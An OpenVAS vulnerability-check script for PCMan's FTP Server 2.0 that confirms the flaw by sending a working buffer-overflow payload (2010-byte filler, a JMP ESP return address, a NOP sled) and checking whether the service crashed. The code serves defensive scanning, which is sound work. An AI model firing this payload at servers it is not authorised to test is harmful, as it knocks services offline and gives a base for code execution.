###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_pcman_ftp_server_mult_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# PCMan's FTP Server Multiple Vulnerabilities
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow a remote attacker to read or write
  arbitrary files or cause denial of service condition result in loss
  of availability for the application.
  Impact Level: Application";

tag_affected = "PCMan's FTP Server version 2.0";
tag_insight = "Improper sanitation of user supplied input via 'PAYLOAD', 'EIP', 'USER',
  'PASS', 'DIR', 'PUT' and 'NOP' parameters.";
tag_solution = "No solution or patch is available as of 2nd July, 2013. Information
  regarding this issue will be updated once the solution details are available.
  For Updates refer to http://pcman.openfoundry.org";
tag_summary = "The remote host is installed with PCMan's FTP Server and is prone
  to multiple vulnerabilities.";

if(description)
{
  script_id(803825);
  script_version("$Revision: 11 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-07-02 11:35:46 +0530 (Tue, 02 Jul 2013)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("PCMan's FTP Server Multiple Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_description(desc);
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/26495");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/122173/pcman-traversal.txt");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/pcmans-ftp-server-20-denial-of-service");
  script_summary("Determine if PCMan's Server is prone to buffer overflow vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("FTP");
  script_dependencies("secpod_ftp_anonymous.nasl");
  script_require_ports("Services/ftp", 21);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0){
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


##
## The script code starts here
##

include("ftp_func.inc");

## Variable Initialization
ftplogin = "";
ftpPort = "";
banner = "";
user = "";
pass = "";
soc = "";

## Get the ftp port from KB
ftpPort = get_kb_item("Services/ftp");
if(!ftpPort){
  ftpPort = 21;
}

## Check Port status
if(!get_port_state(ftpPort)){
  exit(0);
}

## Confirm the Application
banner = get_ftp_banner(port:ftpPort);
if("220 PCMan's FTP Server" >!< banner){
  exit(0);
}

## Get Username from KB, If not given use default Username
user = get_kb_item("ftp/login");
if(!user){
  user = "anonymous";
}

## Get Password from KB, If not given use default Password
pass = get_kb_item("ftp/password");
if(!pass){
  pass = "anonymous";
}

## Open the socket
soc = open_sock_tcp(ftpPort);
if(!soc) exit(0);

## Login to the ftp server
ftplogin = ftp_log_in(socket:soc, user:user, pass:pass);
if(!ftplogin) exit(0);

## Construct the crafted request
PAYLOAD = crap(data: "\x41", length:2010);
EIP     = "\xDB\xFC\x1C\x75";  # 751CFCDB   JMP ESP USER32.DLL
NOP     = crap(data: "\x90", length:10);

## Send specially crafted RETR command
send(socket:soc, data:string(PAYLOAD, EIP, NOP, '\r\n'));

## Close FTP Socket
ftp_close(socket:soc);

## Confirm the Exploit by opening socket
soc = open_sock_tcp(ftpPort);
if(!soc)
{
  security_hole(ftpPort);
  exit(0);
}

## Confirm the Exploit by login
ftplogin = ftp_log_in(socket:soc, user:user, pass:pass);
if(!ftplogin)
{
  security_hole(ftpPort);
  exit(0);
}
